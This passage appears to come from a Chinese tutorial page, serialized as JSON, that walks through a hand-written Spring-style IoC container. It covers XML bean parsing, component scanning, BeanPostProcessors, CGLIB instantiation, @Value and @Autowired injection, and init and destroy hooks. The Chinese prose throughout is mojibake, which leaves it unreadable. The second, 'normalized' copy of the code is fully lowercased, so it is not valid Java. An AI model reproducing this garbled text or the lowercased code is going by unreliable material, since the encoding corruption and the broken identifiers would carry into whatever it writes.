}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @Override\n    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {\n        if (bean instanceof ApplicationContextAware){\n            ((ApplicationContextAware) bean).setApplicationContext(applicationContext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# Bean çåå§åæ¹æ³\n\nBean åå§åæ¹æ³è¿æ¯æ¯è¾ç®åçï¼ä¸»è¦æ¯éè¿å¤æ­æ¯å¦å®ç° InitializingBean æ¥å£ï¼å¦æå®ç°äºï¼åè°ç¨å®ä¾åå¯¹è±¡å®ç°ç afterPropertiesSet æ¹æ³ãå¦æä¸æ¯ä»¥æ¥å£å®ç°çï¼æ¯ä»¥ XML æè¿°çï¼åæ¯éè¿åå°çæ¹å¼è°ç¨è¯¥æ¹æ³ã\n\n    private void invokeInitMethods(String beanName, Object bean, BeanDefinition beanDefinition) throws Exception {\n        // 1. å®ç°æ¥å£ InitializingBean\n        if (bean instanceof InitializingBean) {\n            ((InitializingBean) bean).afterPropertiesSet();\n        }\n\n        // 2. æ³¨è§£éç½® init-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        String initMethodName = beanDefinition.getInitMethodName();\n        if (StrUtil.isNotEmpty(initMethodName)) {\n            Method initMethod = beanDefinition.getBeanClass().getMethod(initMethodName);\n            if (null == initMethod) {\n                throw new BeansException("Could not find an init method named \'" + initMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            initMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userDao" class="cn.bugstack.springframework.test.bean.UserDao" init-method="initDataMethod" destroy-method="destroyDataMethod"/>\n\n\n1\n\n\n\n# åå§åæ¹æ³ä¹å\n\n    @Override\n    public Object applyBeanPostProcessorsAfterInitialization(Object existingBean, String beanName) throws BeansException {\n        Object result = existingBean;\n        for (BeanPostProcessor processor : getBeanPostProcessors()) {\n            Object current = processor.postProcessAfterInitialization(result, beanName);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# æ³¨åéæ¯äºä»¶\n\néæ¯äºä»¶éè¦ Bean å®ç° DisposableBean æ¥å£å¹¶éå destroy () æ¹æ³ãå¦ä¸åæ¯æå®ç° DisposableBean ææå¨ XML æè¿°è¿éæ¯æ¹æ³çæ³¨åå°ä¸ä¸ªå®¹å¨éã\n\n    protected void registerDisposableBeanIfNecessary(String beanName, Object bean, BeanDefinition beanDefinition) {\n        // é Singleton ç±»åç Bean ä¸æ§è¡éæ¯æ¹æ³\n        if (!beanDefinition.isSingleton()) return;\n        if (bean instanceof DisposableBean || StrUtil.isNotEmpty(beanDefinition.getDestroyMethodName())) {\n            registerDisposableBean(beanName, new DisposableBeanAdapter(bean, beanName, beanDefinition));\n        }\n    }\n\n    public void registerDisposableBean(String beanName, DisposableBean bean) {\n        disposableBeans.put(beanName, bean);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nç¶ååæ´ä¸ªå¯å¨è¿ç¨ç»æè°ç¨ registerShutdownHook æ¹æ³æ·»å ä¸ä¸ªé©å­çå¬ã\n\n    @Override\n    public void registerShutdownHook() {\n        // Java ä¸­çä¸ä¸ªæ¹æ³ï¼å®ç¨äºæ³¨å JVM å³é­æ¶è¦æ§è¡çç¹å®ä»£ç åãå½ JVM å³å°å³é­æ¶ï¼è¿äºä»£ç åä¼è¢«æ§è¡ï¼ä»¥ä¾¿è¿è¡æ¸çãéæ¾èµæºç­æä½ã\n        // è¿äºä»£ç åéå¸¸ç§°ä¸ºâé©å­ï¼hookï¼âï¼å æ­¤è¯¥æ¹æ³ä¹è¢«ç§°ä¸ºâæ·»å å³é­é©å­ï¼Add Shutdown Hookï¼âã\n        Runtime.getRuntime().addShutdownHook(new Thread(this::close));\n    }\n\n    @Override\n    public void close() {\n        // åå¸å®¹å¨å³é­äºä»¶\n        publishEvent(new ContextClosedEvent(this));\n        // æ§è¡éæ¯åä¾beançéæ¯æ¹æ³\n        getBeanFactory().destroySingletons();\n    }\n\n    public void destroySingletons() {\n        Set<String> keySet = this.disposableBeans.keySet();\n        Object[] disposableBeanNames = keySet.toArray();\n\n        for (int i = disposableBeanNames.length - 1; i >= 0; i--) {\n            Object beanName = disposableBeanNames[i];\n            DisposableBean disposableBean = disposableBeans.remove(beanName);\n            try {\n                disposableBean.destroy();\n            } catch (Exception e) {\n                throw new BeansException("Destroy method on bean with name \'" + beanName + "\' threw an exception", e);\n            }\n        }\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        // 1. å®ç°æ¥å£ DisposableBean\n        if (bean instanceof DisposableBean) {\n            ((DisposableBean) bean).destroy();\n        }\n        // 2. æ³¨è§£éç½® destroy-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        if (StrUtil.isNotEmpty(destroyMethodName) && !(bean instanceof DisposableBean && "destroy".equals(this.destroyMethodName))) {\n            Method destroyMethod = bean.getClass().getMethod(destroyMethodName);\n            if (null == destroyMethod) {\n                throw new BeansException("Couldn\'t find a destroy method named \'" + destroyMethodName + "\' on bean with name \'" + beanName + "\'");\n            }\n            destroyMethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n\n# scop å¤çåä¾\n\n    public void registerSingleton(String beanName, Object singletonObject) {\n        // ä¸çº§ç¼å­\n        singletonObjects.put(beanName, singletonObject);\n        // äºçº§ç¼å­\n        earlySingletonObjects.remove(beanName);\n        // ä¸çº§ç¼å­\n        singletonFactories.remove(beanName);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n',normalizedContent:'spring æ¯ java å¼åç¨å°æå¤çä¸ä¸ª web æ¡æ¶ï¼æ ¸å¿æ¯ iocï¼æ§å¶åè½¬ï¼å aopï¼é¢ååé¢ï¼ï¼ä½åä¸ºæ¶æï¼æ³è¦å¯¹ spring è¦è¿è¡æ©å±ç­ï¼å¿é¡»è¦äºè§£ spring ççå½å¨æãäºä»¶ãaopãè¡ä¸ºæç¥ç­ãspring çå½å¨æå¦ä¸å¾ï¼\n\n\n\næç¤º\n\næ¬æä¸»è¦äºè§£ spring çå½å¨æçæåªäºï¼ä»¥åä»ä»¬çæ ¸å¿ä»£ç æ¯æä¹ç¼åï¼æ´ä¸ªè¿ç¨æ¯å ioc å di çï¼ioc å°å¯¹è±¡çåå»ºåä¾èµå³ç³»çç»´æ¤ä»ä»£ç ä¸­è±ç¦»åºæ¥ï¼éè¿éç½®è¯»ååå»ºå¯¹è±¡ï¼di ä»æ³¨è§£å±æ§å¡«åè¿ç¨ä»¥å xml å±æ§å¡«åè¿ç¨ä¸ºå·ä½çä½ç°ã\n\n\n# è¯»å xml æä»¶\n\néè¿ classpathxmlapplicationcontext æ¥è¯»åèµæºæä»¶ä¸ç spring.xml\n\n    @test\n    public void test() {\n        classpathxmlapplicationcontext applicationcontext = new classpathxmlapplicationcontext("classpath:spring.xml");\n        userservice userservice = applicationcontext.getbean("userservice", userservice.class);\n        system.out.println("æµè¯ç»æï¼" + userservice.queryuserinfo());\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næ ¹æ®æä»¶ç±»åä½¿ç¨ä¸åçæ¹å¼è¯»åå°æµä¸­\n\n    @override\n    public resource getresource(string location) {\n        assert.notnull(location, "location must not be null");\n        if (location.startswith(classpath_url_prefix)) {\n            return new classpathresource(location.substring(classpath_url_prefix.length()));\n        }\n        else {\n            try {\n                url url = new url(location);\n                return new urlresource(url);\n            } catch (malformedurlexception e) {\n                return new filesystemresource(location);\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nè°ç¨ xml è§£æ\n\n    @override\n    public void loadbeandefinitions(resource resource) throws beansexception {\n        try {\n            try (inputstream inputstream = resource.getinputstream()) {\n                doloadbeandefinitions(inputstream);\n            }\n        } catch (ioexception | classnotfoundexception | documentexception e) {\n            throw new beansexception("ioexception parsing xml document from " + resource, e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# å°è£ beandefinition\n\nè§£æ xml çæ´ä¸ªè¿ç¨ï¼\n\n * è§£æ dom\n * è§£æå¸¦æ @component æ³¨è§£çç±»ï¼å¹¶å°è£ä¸º beandefinition æ³¨åå° beanfactory\n * è§£æä¸æ¯ component-scan å®ä¹çç±»\n\n    protected void doloadbeandefinitions(inputstream inputstream) throws classnotfoundexception, documentexception {\n        // ä½¿ç¨ org.dom4j.io çè§£æå¨\n        saxreader reader = new saxreader();\n        document document = reader.read(inputstream);\n        element root = document.getrootelement();\n        // è§£æ context:component-scan æ ç­¾ï¼æ«æåä¸­çç±»å¹¶æåç¸å³ä¿¡æ¯ï¼ç¨äºç»è£ beandefinition\n        element componentscan = root.element("component-scan");\n        if (null != componentscan) {\n            string scanpath = componentscan.attributevalue("base-package");\n            if (strutil.isempty(scanpath)) {\n                throw new beansexception("the value of base-package attribute can not be empty or null");\n            }\n            // æ«ææ´ä¸ªå\n            scanpackage(scanpath);\n        }\n        list<element> beanlist = root.elements("bean");\n        for (element bean : beanlist) {\n            string id = bean.attributevalue("id");\n            string name = bean.attributevalue("name");\n            string classname = bean.attributevalue("class");\n            string initmethod = bean.attributevalue("init-method");\n            string destroymethodname = bean.attributevalue("destroy-method");\n            string beanscope = bean.attributevalue("scope");\n            // è·å classï¼æ¹ä¾¿è·åç±»ä¸­çåç§°\n            class<?> clazz = class.forname(classname);\n            // ä¼åçº§ id > name\n            string beanname = strutil.isnotempty(id) ? id : name;\n            if (strutil.isempty(beanname)) {\n                beanname = strutil.lowerfirst(clazz.getsimplename());\n            }\n            // å®ä¹bean\n            beandefinition beandefinition = new beandefinition(clazz);\n            beandefinition.setinitmethodname(initmethod);\n            beandefinition.setdestroymethodname(destroymethodname);\n            if (strutil.isnotempty(beanscope)) {\n                beandefinition.setscope(beanscope);\n            }\n            list<element> propertylist = bean.elements("property");\n            // è¯»åå±æ§å¹¶å¡«å\n            for (element property : propertylist) {\n                // è§£ææ ç­¾ï¼property\n                string attrname = property.attributevalue("name");\n                string attrvalue = property.attributevalue("value");\n                string attrref = property.attributevalue("ref");\n                // è·åå±æ§å¼ï¼å¼å¥å¯¹è±¡ãå¼å¯¹è±¡\n                object value = strutil.isnotempty(attrref) ? new beanreference(attrref) : attrvalue;\n                // åå»ºå±æ§ä¿¡æ¯\n                propertyvalue propertyvalue = new propertyvalue(attrname, value);\n                beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n            }\n            if (getregistry().containsbeandefinition(beanname)) {\n                throw new beansexception("duplicate beanname[" + beanname + "] is not allowed");\n            }\n            // æ³¨å beandefinition\n            getregistry().registerbeandefinition(beanname, beandefinition);\n        }\n    }\n\n    private void scanpackage(string scanpath) {\n        string[] basepackages = strutil.splittoarray(scanpath, \',\');\n        classpathbeandefinitionscanner scanner = new classpathbeandefinitionscanner(getregistry());\n        scanner.doscan(basepackages);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n\n\næ ¹æ®æä¾è·¯å¾å°è£ä¸º beandefinition å¹¶æ³¨åå° beanfactory\n\n    public void doscan(string... basepackages) {\n        for (string basepackage : basepackages) {\n            set<beandefinition> candidates = findcandidatecomponents(basepackage);\n            for (beandefinition beandefinition : candidates) {\n                // è§£æ bean çä½ç¨å singletonãprototype\n                string beanscope = resolvebeanscope(beandefinition);\n                if (strutil.isnotempty(beanscope)) {\n                    beandefinition.setscope(beanscope);\n                }\n                registry.registerbeandefinition(determinebeanname(beandefinition), beandefinition);\n            }\n        }\n\n        // æ³¨åå¤çæ³¨è§£ç beanpostprocessor(@autowiredã@value)\n        registry.registerbeandefinition("cn.bugstack.springframework.context.annotation.internalautowiredannotationprocessor", new beandefinition(autowiredannotationbeanpostprocessor.class));\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå¯¹æä¾çåè·¯å¾æ«ææ @component æ³¨è§£çç±»\n\n    public set<beandefinition> findcandidatecomponents(string basepackage) {\n        set<beandefinition> candidates = new linkedhashset<>();\n        set<class<?>> classes = classutil.scanpackagebyannotation(basepackage, component.class);\n        for (class<?> clazz : classes) {\n            candidates.add(new beandefinition(clazz));\n        }\n        return candidates;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# beanfactorypostprocessor\n\nbeanfactorypostprocessor å¯ä»¥ä¿®æ¹æä»¬å¯¹ beandefinition å®ä¹çææä¿¡æ¯ï¼å¯ä»¥æ·»å å±æ§ï¼ä¿®æ¹å±æ§ï¼æ·»å é¢å¤çæ¹æ³ç­ãå·ä½ä¼å¯¹ææå®ç° beanfactorypostprocessor çç±»è¿è¡è·åï¼å¹¶å¾ªç¯è°ç¨ postprocessbeanfactory æ¹æ³\n\n    private void invokebeanfactorypostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanfactorypostprocessor> beanfactorypostprocessormap = beanfactory.getbeansoftype(beanfactorypostprocessor.class);\n        for (beanfactorypostprocessor beanfactorypostprocessor : beanfactorypostprocessormap.values()) {\n            beanfactorypostprocessor.postprocessbeanfactory(beanfactory);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\næä¾ä¸ä¸ªé»è®¤çå®ç°\n\n    @override\n    public void postprocessbeanfactory(configurablelistablebeanfactory beanfactory) throws beansexception {\n        try {\n            // å è½½å±æ§æä»¶\n            defaultresourceloader resourceloader = new defaultresourceloader();\n            resource resource = resourceloader.getresource(location);\n\n            // æå±æ§æä»¶çåå®¹å è½½å°propertieséç»æé®å¼å¯¹\n            properties properties = new properties();\n            properties.load(resource.getinputstream());\n            string[] beandefinitionnames = beanfactory.getbeandefinitionnames();\n            for (string beanname : beandefinitionnames) {\n                beandefinition beandefinition = beanfactory.getbeandefinition(beanname);\n                propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n                for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                    object value = propertyvalue.getvalue();\n                    if (!(value instanceof string)) continue;\n                    value = resolveplaceholder((string) value, properties);\n                    propertyvalues.addpropertyvalue(new propertyvalue(propertyvalue.getname(), value));\n                }\n            }\n            // åå®¹å¨ä¸­æ·»å å­ç¬¦ä¸²è§£æå¨ï¼ä¾è§£æ@valueæ³¨è§£ä½¿ç¨\n            stringvalueresolver valueresolver = new placeholderresolvingstringvalueresolver(properties);\n            // æ³¨åå°å®¹å¨ï¼ä»¥ä¾¿åç»­ä½¿ç¨\n            beanfactory.addembeddedvalueresolver(valueresolver);\n        } catch (ioexception e) {\n            throw new beansexception("could not load properties", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æ³¨åå®ç° beanpostprocessor çç±»\n\nbeanpostprocessor å°±æ¯æä¾äº postprocessbeforeinitializationï¼postprocessafterinitialization ä¸¤ç§æ¹æ³ï¼æä¾æä»¬å¨å®ä¾å bean çæ¶åï¼ææå®ç° beanpostprocessor çç±»ï¼æ³¨åå° list<beanpostprocessor> beanpostprocessors = new arraylist<beanpostprocessor>(); ä¸­\n\n    private void registerbeanpostprocessors(configurablelistablebeanfactory beanfactory) {\n        map<string, beanpostprocessor> beanpostprocessormap = beanfactory.getbeansoftype(beanpostprocessor.class);\n        for (beanpostprocessor beanpostprocessor : beanpostprocessormap.values()) {\n            beanfactory.addbeanpostprocessor(beanpostprocessor);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å®ä¾å bean\n\n    protected <t> t dogetbean(final string name, final object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean##getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // ä»beandefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // å¦æå®ç°äº factorybeanï¼åéè¦è°ç¨ factorybean##getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nå®ä¾å bean çå·ä½æ¹æ³\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // å®ä¾å bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçbeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® bean å±æ§ä¹åï¼åè®¸ beanpostprocessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // ç» bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applypropertyvalues(beanname, bean, beandefinition);\n            // æ§è¡ bean çåå§åæ¹æ³å beanpostprocessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("instantiation of bean failed", e);\n        }\n        // æ³¨åå®ç°äº disposablebean æ¥å£ç bean å¯¹è±¡\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // å¤æ­ scope_singletonãscope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\ncreatebeaninstance ä½¿ç¨äº cglib æ¥å®ä¾åä¸ä¸ª bean, ä¹å¯ä»¥ä½¿ç¨ java èªå¸¦çåå°\n\n    protected object createbeaninstance(beandefinition beandefinition, string beanname, object[] args) {\n        constructor constructortouse = null;\n        class<?> beanclass = beandefinition.getbeanclass();\n        constructor<?>[] declaredconstructors = beanclass.getdeclaredconstructors();\n        for (constructor ctor : declaredconstructors) {\n            if (null != args && ctor.getparametertypes().length == args.length) {\n                constructortouse = ctor;\n                break;\n            }\n        }\n        return getinstantiationstrategy().instantiate(beandefinition, beanname, constructortouse, args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\ncglib å®ç°å®ä¾å\n\n@override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        enhancer enhancer = new enhancer();\n        enhancer.setsuperclass(beandefinition.getbeanclass());\n        enhancer.setcallback(new noop() {\n            @override\n            public int hashcode() {\n                return super.hashcode();\n            }\n        });\n        if (null == ctor) return enhancer.create();\n        return enhancer.create(ctor.getparametertypes(), args);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\njava åå°å®ç°åºåå\n\n    @override\n    public object instantiate(beandefinition beandefinition, string beanname, constructor ctor, object[] args) throws beansexception {\n        class clazz = beandefinition.getbeanclass();\n        try {\n            if (null != ctor) {\n                return clazz.getdeclaredconstructor(ctor.getparametertypes()).newinstance(args);\n            } else {\n                return clazz.getdeclaredconstructor().newinstance();\n            }\n        } catch (nosuchmethodexception | instantiationexception | illegalaccessexception | invocationtargetexception e) {\n            throw new beansexception("failed to instantiate [" + clazz.getname() + "]", e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# æ³¨è§£å±æ§å¡«å\n\næ³¨è§£å±æ§ï¼ä¼ä»ä¹åæ³¨åç beanpostprocessor éå¹é instantiationawarebeanpostprocessor çå¯¹è±¡ï¼å¶ä¸­é»è®¤ç autowiredannotationbeanpostprocessor å·ä½å®ç°äºè¯¥ç±»\n\n    protected void applybeanpostprocessorsbeforeapplyingpropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        for (beanpostprocessor beanpostprocessor : getbeanpostprocessors()) {\n            if (beanpostprocessor instanceof instantiationawarebeanpostprocessor) {\n                propertyvalues pvs = ((instantiationawarebeanpostprocessor) beanpostprocessor).postprocesspropertyvalues(beandefinition.getpropertyvalues(), bean, beanname);\n                if (null != pvs) {\n                    for (propertyvalue propertyvalue : pvs.getpropertyvalues()) {\n                        beandefinition.getpropertyvalues().addpropertyvalue(propertyvalue);\n                    }\n                }\n            }\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nautowiredannotationbeanpostprocessor æç¥æ³¨è§£å±æ§å¡«å\n\n    @override\n    public propertyvalues postprocesspropertyvalues(propertyvalues pvs, object bean, string beanname) throws beansexception {\n        class<?> clazz = bean.getclass();\n        clazz = classutils.iscglibproxyclass(clazz) ? clazz.getsuperclass() : clazz;\n        // è·å¾å¯¹è±¡ææå­æ®µ\n        field[] declaredfields = clazz.getdeclaredfields();\n        for (field field : declaredfields) {\n            // @value æ³¨è§£\n            value valueannotation = field.getannotation(value.class);\n            if (null != valueannotation) {\n                object value = valueannotation.value();\n                // è§£æå¾å°å¼\n                value = beanfactory.resolveembeddedvalue((string) value);\n                // ç±»åè½¬æ¢\n                class<?> sourcetype = value.getclass();\n                class<?> targettype = (class<?>) typeutil.gettype(field);\n                // å¯¹å¼è¿è¡è½¬æ¢å¤ç\n                conversionservice conversionservice = beanfactory.getconversionservice();\n                if (conversionservice != null) {\n                    if (conversionservice.canconvert(sourcetype, targettype)) {\n                        value = conversionservice.convert(value, targettype);\n                    }\n                }\n                // æå¼è®¾ç½®è¿å»\n                beanutil.setfieldvalue(bean, field.getname(), value);\n            }\n        }\n        // 2. å¤çæ³¨è§£ @autowired\n        for (field field : declaredfields) {\n            autowired autowiredannotation = field.getannotation(autowired.class);\n            if (null != autowiredannotation) {\n                class<?> fieldtype = field.gettype();\n                string dependentbeanname = null;\n                qualifier qualifierannotation = field.getannotation(qualifier.class);\n                object dependentbean = null;\n                if (null != qualifierannotation) {\n                    dependentbeanname = qualifierannotation.value();\n                    dependentbean = beanfactory.getbean(dependentbeanname, fieldtype);\n                } else {\n                    dependentbean = beanfactory.getbean(fieldtype);\n                }\n                beanutil.setfieldvalue(bean, field.getname(), dependentbean);\n            }\n        }\n        return pvs;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# xml å±æ§å¡«å\n\nxml å±æ§å¡«åè¿éè¯´è¿ä¼åºç°å¾ªç¯ä¾èµçé®é¢ï¼å¨å®ä¾åé¶æ®µçååå·²ç»å¯¹è¿ä¸ªå¤çäºï¼åç»­ä¼åç¬è®²è§£\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a ä¾èµ bï¼è·å b çå®ä¾å\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // ç±»åè½¬æ¢\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception("error setting property valuesï¼" + beanname + " messageï¼" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# æç¥å¯¹è±¡\n\næç¥å¯¹è±¡åä¸ºä¸ä¸ªæ©å±æ¥å£ï¼åªè¦æä»¬ç bean å®ç°äºè¿äºæ¥å£ï¼å°±å¯ä»¥ä¸ºæä»¬ç bean æä¾é¢å¤çè½å\n\n    private object initializebean(string beanname, object bean, beandefinition beandefinition) {\n        // invokeawaremethodsï¼æç¥å¯¹è±¡ï¼\n        if (bean instanceof aware) {\n            if (bean instanceof beanfactoryaware) {\n                ((beanfactoryaware) bean).setbeanfactory(this);\n            }\n            if (bean instanceof beanclassloaderaware) {\n                ((beanclassloaderaware) bean).setbeanclassloader(getbeanclassloader());\n            }\n            if (bean instanceof beannameaware) {\n                ((beannameaware) bean).setbeanname(beanname);\n            }\n        }\n        // 1. æ§è¡ beanpostprocessor before å¤ç\n        object wrappedbean = applybeanpostprocessorsbeforeinitialization(bean, beanname);\n        // æ§è¡ bean å¯¹è±¡çåå§åæ¹æ³\n        try {\n            invokeinitmethods(beanname, wrappedbean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception("invocation of init method of bean[" + beanname + "] failed", e);\n        }\n        // 2. æ§è¡ beanpostprocessor after å¤ç\n        wrappedbean = applybeanpostprocessorsafterinitialization(wrappedbean, beanname);\n        return wrappedbean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# åå§åæ¹æ³ä¹å\n\nå¨ bean çåå§åæ¹æ³ä¹åè°ç¨ï¼é»è®¤æä¾äº applicationcontext çä¸ä¸ææ³¨å¥ï¼å½æä¸ªç±»å®ç°äº applicationcontextawareï¼å°±æä¾ applicationcontext ä¸ä¸æçè½åï¼åªæ¯æä»¬è¦å®ç°çæ¯ applicationcontextaware ï¼å¹¶ä¸æ¯ beanpostprocessor\n\n    @override\n    public object applybeanpostprocessorsbeforeinitialization(object existingbean, string beanname) throws beansexception {\n        object result = existingbean;\n        for (beanpostprocessor processor : getbeanpostprocessors()) {\n            object current = processor.postprocessbeforeinitialization(result, beanname);\n            if (null == current) return result;\n            result = current;\n        }\n        return result;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n    @override\n    public object postprocessbeforeinitialization(object bean, string beanname) throws beansexception {\n        if (bean instanceof applicationcontextaware){\n            ((applicationcontextaware) bean).setapplicationcontext(applicationcontext);\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# bean çåå§åæ¹æ³\n\nbean åå§åæ¹æ³è¿æ¯æ¯è¾ç®åçï¼ä¸»è¦æ¯éè¿å¤æ­æ¯å¦å®ç° initializingbean æ¥å£ï¼å¦æå®ç°äºï¼åè°ç¨å®ä¾åå¯¹è±¡å®ç°ç afterpropertiesset æ¹æ³ãå¦æä¸æ¯ä»¥æ¥å£å®ç°çï¼æ¯ä»¥ xml æè¿°çï¼åæ¯éè¿åå°çæ¹å¼è°ç¨è¯¥æ¹æ³ã\n\n    private void invokeinitmethods(string beanname, object bean, beandefinition beandefinition) throws exception {\n        // 1. å®ç°æ¥å£ initializingbean\n        if (bean instanceof initializingbean) {\n            ((initializingbean) bean).afterpropertiesset();\n        }\n\n        // 2. æ³¨è§£éç½® init-method {å¤æ­æ¯ä¸ºäºé¿åäºæ¬¡æ§è¡éæ¯}\n        string initmethodname = beandefinition.getinitmethodname();\n        if (strutil.isnotempty(initmethodname)) {\n            method initmethod = beandefinition.getbeanclass().getmethod(initmethodname);\n            if (null == initmethod) {\n                throw new beansexception("could not find an init method named \'" + initmethodname + "\' on bean with name \'" + beanname + "\'");\n            }\n            initmethod.invoke(bean);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n<bean id="userdao" class="cn.bugstack.springframework.test.bean.userdao" init-method="initdatamethod" destroy-method="destroydatamethod"/>\n\n\n1\n\n\n\n# åå§åæ¹æ³ä¹å\n\n    @override\n    public object applybeanpostprocessorsafterinitialization(object existingbean, string beanname) throws beansexception {\n        